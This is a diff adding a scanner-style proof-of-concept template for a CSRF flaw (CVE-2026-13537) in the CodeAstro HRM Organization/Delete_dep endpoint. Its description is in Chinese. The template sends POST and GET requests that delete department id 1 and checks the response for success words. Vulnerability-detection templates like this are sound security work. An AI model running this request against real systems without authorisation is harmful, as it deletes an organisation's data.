@@ -1,0 +1,48 @@
+[info]
+id = "POC-AVE-2026-0008"
+name = "CodeAstro HRM 部门删除CSRF PoC"
+author = "AVE"
+severity = "medium"
+tags = ["csrf", "cve-2026-13537", "codeastro", "cwe-352", "cwe-862"]
+description = "CodeAstro HRM系统Organization.php控制器Delete_dep方法存在CSRF漏洞(CVE-2026-13537)，仅验证用户会话登录状态，未实施CSRF令牌或请求来源验证。攻击者可诱导已登录管理员浏览器发送跨站请求，利用可预测的部门ID参数实现未授权删除任意部门。"
+vuln_id = ["CVE-2026-13537", "AVE-2026-0008"]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/Organization/Delete_dep"
+
+headers.Content-Type = "application/x-www-form-urlencoded"
+headers.Origin = "http://{{host}}"
+headers.Referer = "http://{{host}}/Organization/"
+
+body.type = "form"
+body.id = "1"
+
+[[poc.requests.matchers]]
+type = "status"
+status = [200, 302, 303]
+expect = true
+
+[[poc.requests.matchers]]
+type = "word"
+part = "body"
+words = ["deleted", "success", "Department"]
+expect = true
+
+[[poc.requests]]
+method = "GET"
+path = "/Organization/Delete_dep?id=1"
+
+[[poc.requests.matchers]]
+type = "status"
+status = [200, 302]
+expect = true
+
+[[poc.requests.matchers]]
+type = "word"
+part = "body"
+words = ["deleted", "success", "Department"]
+expect = true
